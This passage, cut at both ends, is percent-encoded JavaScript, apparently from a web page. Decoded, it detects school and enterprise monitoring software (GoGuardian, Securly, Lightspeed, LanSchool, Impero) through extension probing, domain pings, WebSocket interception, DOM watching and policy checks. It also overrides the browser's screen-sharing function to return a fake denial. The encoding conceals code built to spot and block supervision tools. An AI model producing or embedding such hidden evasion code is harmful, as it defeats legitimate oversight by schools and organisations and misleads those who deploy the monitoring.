6F%72%43%75%73%74%6F%6D%45%78%74%49%64%73%0A%20%20%20%20%20%20%20%20%5D%3B%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6D%6F%6E%69%74%6F%72%44%6F%6D%61%69%6E%73%20%3D%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%67%6F%67%75%61%72%64%69%61%6E%2E%63%6F%6D%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%61%70%69%2E%67%6F%67%75%61%72%64%69%61%6E%2E%63%6F%6D%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%65%78%74%2E%67%6F%67%75%61%72%64%69%61%6E%2E%63%6F%6D%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%73%65%63%75%72%6C%79%2E%63%6F%6D%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%61%70%69%2E%73%65%63%75%72%6C%79%2E%63%6F%6D%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%6C%69%67%68%74%73%70%65%65%64%2E%61%70%70%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%66%69%6C%74%65%72%2E%6C%69%67%68%74%73%70%65%65%64%73%79%73%74%65%6D%73%2E%63%6F%6D%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%6C%61%6E%73%63%68%6F%6F%6C%2E%63%6F%6D%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%69%6D%70%65%72%6F%2E%75%73%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%63%6C%69%65%6E%74%2E%69%6D%70%65%72%6F%2E%69%6F%27%0A%20%20%20%20%20%20%20%20%5D%3B%0A%0A%20%20%20%20%20%20%20%20%74%72%79%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%45%78%74%65%6E%73%69%6F%6E%20%50%72%6F%62%69%6E%67%0A%20%20%20%20%20%20%20%20%20%20%20%20%66%6F%72%20%28%63%6F%6E%73%74%20%69%64%20%6F%66%20%65%78%74%65%6E%73%69%6F%6E%49%64%73%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%63%68%72%6F%6D%65%20%26%26%20%63%68%72%6F%6D%65%2E%72%75%6E%74%69%6D%65%20%26%26%20%63%68%72%6F%6D%65%2E%72%75%6E%74%69%6D%65%2E%73%65%6E%64%4D%65%73%73%61%67%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%72%65%73%70%6F%6E%73%65%20%3D%20%61%77%61%69%74%20%6E%65%77%20%50%72%6F%6D%69%73%65%28%28%72%65%73%6F%6C%76%65%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%68%72%6F%6D%65%2E%72%75%6E%74%69%6D%65%2E%73%65%6E%64%4D%65%73%73%61%67%65%28%69%64%2C%20%7B%7D%2C%20%72%65%73%6F%6C%76%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%72%65%73%70%6F%6E%73%65%20%21%3D%3D%20%75%6E%64%65%66%69%6E%65%64%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%60%45%78%74%65%6E%73%69%6F%6E%20%64%65%74%65%63%74%65%64%3A%20%24%7B%69%64%7D%60%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6B%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%63%61%74%63%68%20%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%60%45%78%74%65%6E%73%69%6F%6E%20%63%68%65%63%6B%20%66%61%69%6C%65%64%20%66%6F%72%20%24%7B%69%64%7D%3A%20%24%7B%65%2E%6D%65%73%73%61%67%65%7D%60%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%4E%65%74%77%6F%72%6B%20%50%72%6F%62%65%73%0A%20%20%20%20%20%20%20%20%20%20%20%20%66%6F%72%20%28%63%6F%6E%73%74%20%64%6F%6D%61%69%6E%20%6F%66%20%6D%6F%6E%69%74%6F%72%44%6F%6D%61%69%6E%73%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%72%65%73%70%6F%6E%73%65%20%3D%20%61%77%61%69%74%20%66%65%74%63%68%28%60%68%74%74%70%73%3A%2F%2F%24%7B%64%6F%6D%61%69%6E%7D%60%2C%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%65%74%68%6F%64%3A%20%27%48%45%41%44%27%2C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%64%65%3A%20%27%6E%6F%2D%63%6F%72%73%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%61%63%68%65%3A%20%27%6E%6F%2D%73%74%6F%72%65%27%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%72%65%73%70%6F%6E%73%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%60%4E%65%74%77%6F%72%6B%20%61%63%74%69%76%69%74%79%20%74%6F%20%24%7B%64%6F%6D%61%69%6E%7D%60%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6B%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%63%61%74%63%68%20%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%60%4E%65%74%77%6F%72%6B%20%63%68%65%63%6B%20%66%61%69%6C%65%64%20%66%6F%72%20%24%7B%64%6F%6D%61%69%6E%7D%3A%20%24%7B%65%2E%6D%65%73%73%61%67%65%7D%60%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%57%65%62%44%72%69%76%65%72%2F%41%75%74%6F%6D%61%74%69%6F%6E%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6E%61%76%69%67%61%74%6F%72%2E%77%65%62%64%72%69%76%65%72%20%7C%7C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%64%6F%63%75%6D%65%6E%74%2E%64%6F%63%75%6D%65%6E%74%45%6C%65%6D%65%6E%74%2E%67%65%74%41%74%74%72%69%62%75%74%65%28%27%77%65%62%64%72%69%76%65%72%27%29%20%7C%7C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6E%61%76%69%67%61%74%6F%72%2E%75%73%65%72%41%67%65%6E%74%2E%69%6E%63%6C%75%64%65%73%28%27%48%65%61%64%6C%65%73%73%43%68%72%6F%6D%65%27%29%20%7C%7C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%44%6F%6D%61%69%6E%73%2E%73%6F%6D%65%28%64%6F%6D%61%69%6E%20%3D%3E%20%6E%61%76%69%67%61%74%6F%72%2E%75%73%65%72%41%67%65%6E%74%2E%69%6E%63%6C%75%64%65%73%28%64%6F%6D%61%69%6E%29%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%27%57%65%62%44%72%69%76%65%72%20%6F%72%20%6D%6F%6E%69%74%6F%72%69%6E%67%20%55%41%20%64%65%74%65%63%74%65%64%27%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%52%65%73%6F%75%72%63%65%20%4D%6F%6E%69%74%6F%72%69%6E%67%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%70%65%72%66%6F%72%6D%61%6E%63%65%20%26%26%20%70%65%72%66%6F%72%6D%61%6E%63%65%2E%6D%65%6D%6F%72%79%20%26%26%20%70%65%72%66%6F%72%6D%61%6E%63%65%2E%6D%65%6D%6F%72%79%2E%75%73%65%64%4A%53%48%65%61%70%53%69%7A%65%20%3E%20%31%35%30%30%30%30%30%30%30%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%27%48%69%67%68%20%6D%65%6D%6F%72%79%20%75%73%61%67%65%20%64%65%74%65%63%74%65%64%27%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%57%65%62%53%6F%63%6B%65%74%20%49%6E%74%65%72%63%65%70%74%6F%72%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6F%72%69%67%69%6E%61%6C%57%65%62%53%6F%63%6B%65%74%20%3D%20%77%69%6E%64%6F%77%2E%57%65%62%53%6F%63%6B%65%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%57%65%62%53%6F%63%6B%65%74%20%3D%20%66%75%6E%63%74%69%6F%6E%28%2E%2E%2E%61%72%67%73%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%77%73%55%72%6C%20%3D%20%61%72%67%73%5B%30%5D%2E%74%6F%4C%6F%77%65%72%43%61%73%65%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6D%6F%6E%69%74%6F%72%44%6F%6D%61%69%6E%73%2E%73%6F%6D%65%28%64%6F%6D%61%69%6E%20%3D%3E%20%77%73%55%72%6C%2E%69%6E%63%6C%75%64%65%73%28%64%6F%6D%61%69%6E%29%29%20%7C%7C%20%77%73%55%72%6C%2E%69%6E%63%6C%75%64%65%73%28%27%67%67%77%73%27%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%60%57%65%62%53%6F%63%6B%65%74%20%74%6F%20%24%7B%77%73%55%72%6C%7D%60%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%6E%65%77%20%6F%72%69%67%69%6E%61%6C%57%65%62%53%6F%63%6B%65%74%28%2E%2E%2E%61%72%67%73%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%44%4F%4D%20%4D%75%74%61%74%69%6F%6E%20%4F%62%73%65%72%76%65%72%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6F%62%73%65%72%76%65%72%20%3D%20%6E%65%77%20%4D%75%74%61%74%69%6F%6E%4F%62%73%65%72%76%65%72%28%28%6D%75%74%61%74%69%6F%6E%73%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%66%6F%72%20%28%63%6F%6E%73%74%20%6D%75%74%61%74%69%6F%6E%20%6F%66%20%6D%75%74%61%74%69%6F%6E%73%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6D%75%74%61%74%69%6F%6E%2E%61%64%64%65%64%4E%6F%64%65%73%2E%6C%65%6E%67%74%68%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%66%6F%72%20%28%63%6F%6E%73%74%20%6E%6F%64%65%20%6F%66%20%6D%75%74%61%74%69%6F%6E%2E%61%64%64%65%64%4E%6F%64%65%73%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%28%6E%6F%64%65%2E%73%72%63%20%26%26%20%6D%6F%6E%69%74%6F%72%44%6F%6D%61%69%6E%73%2E%73%6F%6D%65%28%64%6F%6D%61%69%6E%20%3D%3E%20%6E%6F%64%65%2E%73%72%63%2E%69%6E%63%6C%75%64%65%73%28%64%6F%6D%61%69%6E%29%29%29%20%7C%7C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%28%6E%6F%64%65%2E%69%64%20%26%26%20%2F%67%67%2D%7C%6D%6F%6E%69%74%6F%72%7C%73%65%63%75%72%6C%79%7C%6C%69%67%68%74%73%70%65%65%64%7C%6C%61%6E%73%63%68%6F%6F%6C%7C%69%6D%70%65%72%6F%2F%69%2E%74%65%73%74%28%6E%6F%64%65%2E%69%64%29%29%20%7C%7C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%28%6E%6F%64%65%2E%63%6C%61%73%73%4E%61%6D%65%20%26%26%20%2F%67%6F%67%75%61%72%64%69%61%6E%7C%6D%6F%6E%69%74%6F%72%7C%73%65%63%75%72%6C%79%7C%6C%69%67%68%74%73%70%65%65%64%7C%6C%61%6E%73%63%68%6F%6F%6C%7C%69%6D%70%65%72%6F%2F%69%2E%74%65%73%74%28%6E%6F%64%65%2E%63%6C%61%73%73%4E%61%6D%65%29%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%27%53%75%73%70%69%63%69%6F%75%73%20%44%4F%4D%20%65%6C%65%6D%65%6E%74%20%64%65%74%65%63%74%65%64%27%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6B%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6F%62%73%65%72%76%65%72%2E%6F%62%73%65%72%76%65%28%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2C%20%7B%20%63%68%69%6C%64%4C%69%73%74%3A%20%74%72%75%65%2C%20%73%75%62%74%72%65%65%3A%20%74%72%75%65%2C%20%61%74%74%72%69%62%75%74%65%73%3A%20%74%72%75%65%20%7D%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%50%65%72%66%6F%72%6D%61%6E%63%65%4F%62%73%65%72%76%65%72%20%66%6F%72%20%4E%65%74%77%6F%72%6B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%27%50%65%72%66%6F%72%6D%61%6E%63%65%4F%62%73%65%72%76%65%72%27%20%69%6E%20%77%69%6E%64%6F%77%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6E%65%74%4F%62%73%65%72%76%65%72%20%3D%20%6E%65%77%20%50%65%72%66%6F%72%6D%61%6E%63%65%4F%62%73%65%72%76%65%72%28%28%6C%69%73%74%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%66%6F%72%20%28%63%6F%6E%73%74%20%65%6E%74%72%79%20%6F%66%20%6C%69%73%74%2E%67%65%74%45%6E%74%72%69%65%73%28%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6D%6F%6E%69%74%6F%72%44%6F%6D%61%69%6E%73%2E%73%6F%6D%65%28%64%6F%6D%61%69%6E%20%3D%3E%20%65%6E%74%72%79%2E%6E%61%6D%65%2E%74%6F%4C%6F%77%65%72%43%61%73%65%28%29%2E%69%6E%63%6C%75%64%65%73%28%64%6F%6D%61%69%6E%29%29%20%7C%7C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%65%6E%74%72%79%2E%69%6E%69%74%69%61%74%6F%72%54%79%70%65%20%3D%3D%3D%20%27%66%65%74%63%68%27%20%26%26%20%2F%61%70%69%5C%2E%67%67%7C%73%65%63%75%72%6C%79%7C%6C%69%67%68%74%73%70%65%65%64%7C%69%6D%70%65%72%6F%2F%69%2E%74%65%73%74%28%65%6E%74%72%79%2E%6E%61%6D%65%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%60%4E%65%74%77%6F%72%6B%20%72%65%73%6F%75%72%63%65%20%64%65%74%65%63%74%65%64%3A%20%24%7B%65%6E%74%72%79%2E%6E%61%6D%65%7D%60%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6E%65%74%4F%62%73%65%72%76%65%72%2E%6F%62%73%65%72%76%65%28%7B%20%74%79%70%65%3A%20%27%72%65%73%6F%75%72%63%65%27%2C%20%62%75%66%66%65%72%65%64%3A%20%74%72%75%65%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%45%6E%74%65%72%70%72%69%73%65%20%50%6F%6C%69%63%79%20%43%68%65%63%6B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%63%68%72%6F%6D%65%20%26%26%20%63%68%72%6F%6D%65%2E%65%6E%74%65%72%70%72%69%73%65%20%26%26%20%63%68%72%6F%6D%65%2E%65%6E%74%65%72%70%72%69%73%65%2E%64%65%76%69%63%65%41%74%74%72%69%62%75%74%65%73%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%27%45%6E%74%65%72%70%72%69%73%65%20%70%6F%6C%69%63%79%20%64%65%74%65%63%74%65%64%27%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%53%63%72%65%65%6E%20%43%61%70%74%75%72%65%20%44%65%74%65%63%74%69%6F%6E%20%28%54%68%72%6F%74%74%6C%65%64%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6E%61%76%69%67%61%74%6F%72%2E%6D%65%64%69%61%44%65%76%69%63%65%73%20%26%26%20%6E%61%76%69%67%61%74%6F%72%2E%6D%65%64%69%61%44%65%76%69%63%65%73%2E%67%65%74%44%69%73%70%6C%61%79%4D%65%64%69%61%20%26%26%20%44%61%74%65%2E%6E%6F%77%28%29%20%2D%20%6C%61%73%74%53%63%72%65%65%6E%43%68%65%63%6B%20%3E%20%73%63%72%65%65%6E%43%68%65%63%6B%49%6E%74%65%72%76%61%6C%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6C%61%73%74%53%63%72%65%65%6E%43%68%65%63%6B%20%3D%20%44%61%74%65%2E%6E%6F%77%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%61%77%61%69%74%20%6E%61%76%69%67%61%74%6F%72%2E%6D%65%64%69%61%44%65%76%69%63%65%73%2E%67%65%74%44%69%73%70%6C%61%79%4D%65%64%69%61%28%7B%20%76%69%64%65%6F%3A%20%74%72%75%65%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%27%53%63%72%65%65%6E%20%73%68%61%72%69%6E%67%20%61%6C%6C%6F%77%65%64%20%75%6E%65%78%70%65%63%74%65%64%6C%79%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%63%61%74%63%68%20%28%65%72%72%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%65%72%72%2E%6E%61%6D%65%20%3D%3D%3D%20%27%4E%6F%74%41%6C%6C%6F%77%65%64%45%72%72%6F%72%27%20%7C%7C%20%65%72%72%2E%6D%65%73%73%61%67%65%2E%69%6E%63%6C%75%64%65%73%28%27%70%65%72%6D%69%73%73%69%6F%6E%27%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%27%53%63%72%65%65%6E%20%73%68%61%72%69%6E%67%20%70%65%72%6D%69%73%73%69%6F%6E%20%64%65%6E%69%65%64%20%2D%20%6D%6F%6E%69%74%6F%72%69%6E%67%20%6C%69%6B%65%6C%79%27%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%60%53%63%72%65%65%6E%20%73%68%61%72%69%6E%67%20%63%68%65%63%6B%20%66%61%69%6C%65%64%3A%20%24%7B%65%72%72%2E%6D%65%73%73%61%67%65%7D%60%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%50%72%6F%6D%70%74%20%53%75%70%70%72%65%73%73%69%6F%6E%0A%20%20%20%20%20%20%20%20%20%20%20%20%6E%61%76%69%67%61%74%6F%72%2E%6D%65%64%69%61%44%65%76%69%63%65%73%2E%67%65%74%44%69%73%70%6C%61%79%4D%65%64%69%61%20%3D%20%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%27%49%6E%74%65%72%63%65%70%74%65%64%20%73%63%72%65%65%6E%2D%73%68%61%72%69%6E%67%20%72%65%71%75%65%73%74%27%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%74%68%72%6F%77%20%6E%65%77%20%45%72%72%6F%72%28%27%4E%6F%74%41%6C%6C%6F%77%65%64%45%72%72%6F%72%3A%20%55%73%65%72%20%64%65%6E%69%65%64%20%73%63%72%65%65%6E%20%73%68%61%72%69%6E%67%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20%7D%20%63%61%74%63%68%20%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%60%45%72%72%6F%72%20%69%6E%20%63%68%65%63%6B%3A%20%24%7B%65%2E%6D%65%73%73%61%67%65%7D%60%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%53%65%74%53%74%61%74%75%73%28%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%29%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2F%2F%20%49%6E%69%74%69%61%6C%20%61%6E%64%20%50%65%72%69%6F%64%69%63%20%43%68%65%63%6B%73%0A%20%20%20%20%6D%6F%6E%69%74%6F%72%43%68%65%63%6B%28%29%3B%0A%20%20%20%20%73%65%74%49%6E%74%65%72%76%61%6C%28%6D%6F%6E%69%74%6F%72%43%68%65%63%6B%2C%20%35%30%30%30%29%3B%0A%0A%20%20%20%20%2F%2F%20%43%6C%65%61%6E%75%70%0A%20%20%20%20%77%69%6E%64%6F%77%2E%6F%6E%75%6E%6C%6F%61%64%20%3D%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%69%66%20%28%6F%62%73%65%72%76%65%72%29%20%6F%62%73%65%72%76%65%72%2E%64%69%73%63%6F%6E%6E%65%63%74%28%29%3B%0A%20%20%20%20%20%20%20%20%69%66%20%28%6E%65%74%4F%62%73%65%72%76%65%72%29%20%6E%65%74%4F%62%73%65%72%76%65%72%2E%64%69%73%63%6F%6E%6E%65%63%74%28%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%63%6F%6E%73%74%20%61%6C%6C%49%66%72%61%6D%65%73%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%22%69%66%72%61%6D%65%22%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%22%29%3B%0A%0A%20%20%20%20%69%66%20%28%61%6C%6C%49%66%72%61%6D%65%73%2E%6C%65%6E%67%74%68%20%3E%20%30%29%20%7B%0A%20%20%20%20%20%20%69%66%72%61%6D%65%54%6F%67%67%6C%